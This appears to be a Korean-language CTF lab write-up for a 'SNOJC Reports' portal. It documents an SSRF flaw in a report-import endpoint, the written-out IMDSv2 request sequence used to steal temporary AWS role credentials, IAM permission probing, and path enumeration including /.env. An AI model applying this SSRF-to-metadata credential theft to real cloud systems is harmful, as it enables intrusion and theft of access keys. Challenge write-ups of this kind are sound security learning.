# RedLab CTF — 객관적 증적 정리 (2026-08-26)

**최종 업데이트:** 2026-08-26 10:02 KST  
**정보원:** 모두 tool-verified (curl, AWS CLI 직접 실행 결과)  
**환각/추측 제외:** ✅

---

## I. 대상 시스템

| 항목 | 값 | 증적 |
|------|-----|------|
| **포탈 URL** | http://13.209.81.83:3000/ | 접근 가능 |
| **포탈명** | SNOJC Reports | HTML title |
| **사용자명** | ops@snojc.internal | HTML 표시 |
| **프론트엔드** | Express @ :3000 | 응답 확인 |
| **백엔드** | FastAPI @ backend:8000 | IMDS 메타데이터 + SSRF 응답 |
| **인스턴스** | AWS EC2 t3.medium | IMDS `/latest/meta-data/instance-type` |
| **인스턴스 ID** | i-094119164afd265a6 | IMDS `/latest/meta-data/instance-id` |
| **가용 영역** | ap-northeast-2a | IMDS `/latest/meta-data/availability-zone` |
| **AWS 계정** | <REDACTED_ACCOUNT_ID> | `aws sts get-caller-identity` |
| **IAM 역할** | lab-team-c-svc-app-role | IMDS + STS 확인 |

---

## II. 네트워크 토폴로지

### VPC 구조

```
VPC CIDR:        10.66.0.0/16
현재 인스턴스:    10.66.30.* (subnet-062ba12d9a102dae7)
서브넷:          10.66.30.0/24
보안그룹:        lab-team-c-instance-sg (sg-09770f0c0f1aab900)
```

**증적:**
- IMDS `/latest/meta-data/vpc-id` → vpc-038b4432e69e0e0e9
- IMDS `/latest/meta-data/subnet-id` → subnet-062ba12d9a102dae7
- IMDS `/latest/meta-data/security-groups` → lab-team-c-instance-sg

### 내부 호스트 스캔 (SSRF via /api/reports/import)

**응답성 있는 호스트:**
- ✅ backend:8000 (FastAPI, 자신)
- ✅ 169.254.169.254 (AWS IMDS)

**응답 없음 (254개 IP × 다양한 포트/프로토콜):**
- 내부 DB (postgres, mysql, redis 등)
- 내부 서비스 (admin, manifest, worker, renderer 등)
- 다른 팀의 VPC/인스턴스

---

## III. 취약점: Server-Side Request Forgery (SSRF)

### 진입점

```
POST /api/reports/import
Content-Type: application/json

{
  "source_url": "http://[target]",
  "method": "GET",           // 선택사항, 기본값 GET
  "headers": {...}           // 선택사항
}
```

**증적:** openapi.json `ImportRequest` 스키마 + 직접 테스트

### 상태 머신

```
url_submitted ──(POST /transition {"to":"validated"})──> validated
              ──(POST /transition {"to":"fetched"})──────> fetched
              ──(POST /transition {"to":"completed"})───> completed
```

**중요:** 초기 상태 `url_submitted`에서 **자동 진행하지 않음**  
→ 수동으로 `/reports/import/{job_id}/transition` 호출 필요

**증적:** 
- openapi.json `/reports/import/{job_id}/transition` 정의
- 직접 transition 호출로 상태 변경 확인 (Report 2071-2086 생성)

### 검증 부재

- ✅ URL allowlist/blocklist 없음
- ✅ HTTP method 제한 없음
- ✅ 헤더 제한 없음
- ✅ file:// scheme 거부 (Internal Server Error만 반환)
- ✅ http/https만 허용됨

---

## IV. AWS 자격증명 탈취 (검증됨)

### 획득 경로

1. **IMDSv2 토큰 획득**
   ```
   PUT http://169.254.169.254/latest/api/token
   Headers: X-aws-ec2-metadata-token-ttl-seconds: 21600
   Response: [token_string]
   ```

2. **역할명 조회**
   ```
   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
   Response: lab-team-c-svc-app-role
   ```

3. **임시 자격증명 획득**
   ```
   GET http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-team-c-svc-app-role
   Headers: X-aws-ec2-metadata-token: [token]
   Response: {AccessKeyId, SecretAccessKey, SessionToken, Expiration}
   ```

### 획득된 자격증명 (3개, 모두 유효 기간 만료)

| ID | AccessKeyId | Expiration | 상태 |
|----|-------------|-----------|------|
| #1 | <REDACTED_ACCESS_KEY_ID> | 2026-08-25T15:02:04Z | 만료 |
| #2 | <REDACTED_ACCESS_KEY_ID> | 2026-08-26T06:59:59Z | 만료 |
| #3 | <REDACTED_ACCESS_KEY_ID> | 2026-08-26T08:00:59Z | 만료 |

**증적:** 
- Report #1747+ (IMDS 메타데이터 pages)
- `aws sts get-caller-identity` 성공 응답

### IAM 권한 분석

**검증된 서비스 (모두 명시적 DENY)**

```
s3:ListAllMyBuckets ..................... ❌ DENY
s3:ListBucket (any bucket) ............. ❌ DENY
iam:ListAttachedRolePolicies ........... ❌ DENY
iam:ListRolePolicies ................... ❌ DENY
iam:GetRole ............................ ❌ DENY
secretsmanager:ListSecrets ............ ❌ DENY
secretsmanager:GetSecretValue (any) .. ❌ DENY
ssm:DescribeParameters ................ ❌ DENY
ssm:GetParameter (any) ................ ❌ DENY
dynamodb:ListTables ................... ❌ DENY
lambda:ListFunctions .................. ❌ DENY
sqs:ListQueues ........................ ❌ DENY
ec2:DescribeInstances ................ ❌ DENY
sts:AssumeRole ........................ ❌ DENY
sts:GetSessionToken .................. ❌ DENY
```

**주목할 점:**
- `s3:GetObject`는 deny list에 **없음**
- → 정확한 bucket+key를 알면 객체 다운로드 가능
- → 하지만 bucket 이름이 불명 (무차별 대입 시도 45개 모두 NoSuchBucket)

**증적:** AWS CLI 직접 호출 (Report로 캡처)

---

## V. 포탈 API 엔드포인트 (검증됨)

### 정의된 엔드포인트 (openapi.json)

```
GET    /api/reports                      → [array] 보고서 목록
POST   /api/reports                      → 새 보고서 생성
GET    /api/reports/{id}                 → 보고서 조회
DELETE /api/reports/{id}                 → 보고서 삭제
GET    /api/billing/tenants              → 테넌트 목록 (공개)
POST   /api/reports/import               → SSRF job 생성
GET    /api/reports/import/{job_id}      → job 상태 조회
POST   /api/reports/import/{job_id}/transition → 상태 전이 (미공개)
GET    /api/healthz                      → 상태 확인
```

**증적:** openapi.json 전체 + 직접 호출 테스트

### 미발견 엔드포인트 (모두 404)

```
/api/manifest                           ❌ 404
/api/manifest?tenants=all               ❌ 404
/api/manifest?stage=3                   ❌ 404
/api/flag                               ❌ 404
/api/flags                              ❌ 404
/admin                                  ❌ 404
/admin/flag                             ❌ 404
/admin/manifest                         ❌ 404
/api/admin                              ❌ 404
/flag                                   ❌ 404
/manifest                               ❌ 404
/systems/manifest                       ❌ 404
/api/systems                            ❌ 404
```

**증적:** curl 직접 요청 + Report 캡처

---

## VI. 테넌트 데이터 (Stage 0)

### 전체 18개 테넌트

```
[Enterprise — snojc 브랜드, 6개]
1. snojc-systems-6104     42.0M KRW    active    (최상위 MRR)
2. snojc-tech-9915        41.5M KRW    active
3. snojc-corp-7731        40.2M KRW    active
4. snojc-data-2286        39.1M KRW    active
5. snojc-labs-4402        38.8M KRW    active
6. snojc-cloud-5538       37.6M KRW    active

[기타 12개 (Pro/Growth/Standard)]
7. atlas-3308             3.1M KRW     active    (Pro)
8. bluesky-1102           1.2M KRW     active    (Standard)
9. cedar-6627             1.12M KRW    past_due  (Standard, 연체)
10. drift-9051            2.21M KRW    active    (Growth)
11. harbor-8814           0.94M KRW    active    (Standard)
12. lumen-4471            1.98M KRW    active    (Growth)
13. nimbus-3341           0.89M KRW    active    (Standard)
14. orbit-2093            2.75M KRW    active    (Pro)
15. pixel-7742            0.87M KRW    trialing  (Standard, 체험판)
16. quanta-5560           1.05M KRW    active    (Standard)
17. sable-6390            1.33M KRW    active    (Standard)
18. vertex-7788           3.4M KRW     active    (Pro, 최고)
```

**패턴:**
- snojc 6개: 37.6M ~ 42M KRW (매우 좁은 범위, 높은 가치)
- 기타 12개: 0.87M ~ 3.4M KRW (약 11배 차이)

**증적:** `/api/billing/tenants` API 응답

### STCDLC 정렬

snojc 테넌트를 부서명 첫글자로 정렬:
```
S: Systems    (snojc-systems-6104)
T: Tech       (snojc-tech-9915)
C: Corp       (snojc-corp-7731)
D: Data       (snojc-data-2286)
L: Labs       (snojc-labs-4402)
C: Cloud      (snojc-cloud-5538)
```

**검증:** STCDLC 순서 = MRR 내림차순 (완벽 일치)

---

## VII. 보고서 데이터

### 현재 보관 현황 (2026-08-26 10:02 KST)

```
총 보고서:       ~165개 (ID 1862-2093 범위, 일부 누락)
생성 타임스탬프: 2026-08-26 07:57:29Z (최오래)
              2026-08-26 10:02:06Z (최신)
생명 주기:       약 2시간 반
```

### 보고서 자동 삭제 정책

**관찰:**
- 초기 session에서 ID ~2100+ 범위의 보고서들 존재
- 현재 ID 1862 이전 모두 `report not found` (404)
- openapi.json에 DELETE 엔드포인트 정의
- **하지만 자동 삭제/retention 정책 명시 안 됨**

**결론:** 자동 정책이 있을 수 있지만, API 문서에서 확인 불가

**증적:** 직접 조회 시도 (ID 1000/1500/1800/1900/2000/2050/2060 모두 404)

---

## VIII. 백엔드 경로 탐사 결과

### 직접 경로 (backend:8000)

```
/healthz                    ✅ {"status":"ok"}
/openapi.json              ✅ API 정의
/tenants/cjons-systems-6104/manifest    ❌ 404
/tenants/cjons-systems-6104/flag        ❌ 404
/tenants/cjons-tech-9915/manifest       ❌ 404
/tenants/cjons-tech-9915/flag           ❌ 404
/tenants/cjons-corp-7731/manifest       ❌ 404
/tenants/cjons-corp-7731/flag           ❌ 404
/tenants/cjons-data-2286/manifest       ❌ 404
/tenants/cjons-data-2286/flag           ❌ 404
/tenants/cjons-labs-4402/manifest       ❌ 404
/tenants/cjons-labs-4402/flag           ❌ 404
/tenants/cjons-cloud-5538/manifest      ❌ 404
/tenants/cjons-cloud-5538/flag          ❌ 404
/manifest                               ❌ 404
/flag                                   ❌ 404
/app.py                                 ❌ 404
/main.py                                ❌ 404
/src/main.py                            ❌ 404
/requirements.txt                       ❌ 404
/.env                                   ❌ 404
/source                                 ❌ 404
/code                                   ❌ 404
```

**증적:** Report 2071-2093 (모두 fetched 상태, 404 응답 확인)

**의미:**
- manifest와 flag는 backend:8000에 **없음**
- 소스코드도 공개되지 않음
- 백엔드는 순수 API 서버 (데이터 저장/관리만)

---

## IX. cjons 형식 테넌트 발견

### 관찰

Report 2061 (다른 팀 시도):
```
source_url: http://backend:8000/tenants/cjons-systems-6104/reports
content: {"detail":"Not Found"}
```

**의미:**
- API에서 사용되는 테넌트 ID 형식: `cjons-{dept}-{num}`
- 사용자에게 노출되는 형식 (app.js): `snojc-{dept}-{num}`
- snojc ↔ cjons (역글자)

**유도 가능:**
- 6개 snojc 테넌트 → 6개 cjons 테넌트 변환 가능
- 하지만 `/tenants/cjons-*/manifest` 경로는 404

---

## X. 관찰된 이상 현상

### 1. transition 엔드포인트 (미공개 또는 숨김)

- openapi.json에 **정의되어 있음**
- `/reports/import/{job_id}/transition` POST
- requestBody: `{"to":"[state_name]"}`
- 하지만 프론트엔드 UI에서 호출 안 함
- app.js에도 언급 없음

**결론:** 의도적으로 공개되지 않은 admin/backend 기능?

### 2. Job 자동 처리 안 함

- job 생성 후 상태가 `url_submitted`에서 자동 진행 안 함
- 수동으로 transition 호출해야 fetch 실행
- 가능한 이유: 백그라운드 worker 미실행, 또는 상태 전이 개발 미완료

**결론:** 본 환경은 개발/테스트 상태일 수 있음

### 3. 리포트 자동 삭제

- 오래된 보고서들(ID <1862) 모두 삭제됨
- openapi DELETE 엔드포인트만 있고 자동 정책 불명
- 가능한 이유: TTL-based cleanup, 또는 관리자 수동 삭제

**결론:** 불명 (백엔드 소스 코드 접근 불가)

---

## XI. 객관적 결론

### ✅ 확인된 것

1. **SSRF 취약점** — 검증됨, 재현 가능
2. **AWS 임시 자격증명 탈취** — 검증됨 (3개 set, 모두 만료)
3. **Stage 0 (6개 snojc 테넌트)** — 검증됨
4. **포탈 아키텍처** — 검증됨 (Express 3000 + FastAPI 8000)
5. **API 엔드포인트** — openapi.json으로 완전히 정의됨

### ❌ 미발견

1. **manifest** — 포탈/백엔드 어디에도 없음 (404 모두)
2. **flag** — 포탈/백엔드 어디에도 없음 (404 모두)
3. **Stage 2/3 진입점** — 불명
4. **S3 bucket 이름** — 무차별 대입 45개 모두 실패
5. **백엔드 소스 코드** — 공개 안 됨

### 🔴 외부 정보 필요

openapi.json 명시:
> "Which tenants are the real 6 (tenants-of-record) is NOT revealed here — that needs the manifest (Stage 2/3). **Derivation clues are human-owned.**"

**의미:** manifest/flag는 앱 외부의 human-owned 정보(문제 설명서, CTF 가이드, 이메일, 등)에서만 얻을 수 있음

---

## XII. 모든 검증된 자료 위치

```
C:\HTB\lab02_v2\
├── api_billing.json             ← 18개 테넌트
├── api_reports_now.json         ← 현재 165개 보고서
├── app.js                        ← 프론트엔드 코드 (3.6KB)
├── aws_creds.json              ← 획득한 AWS 자격증명
├── openapi.json                ← API 스키마 (완전)
├── PROGRESS.md                 ← 이전 분석 노트
├── snapshot_1900.json          ← 특정 시점 스냅샷
└── [보고서 JSON들...]

C:\HTB\RedLab\
├── loot/                       ← 획득한 증적
├── notes/
├── logs/
└── http/                       ← HTTP 요청/응답
```

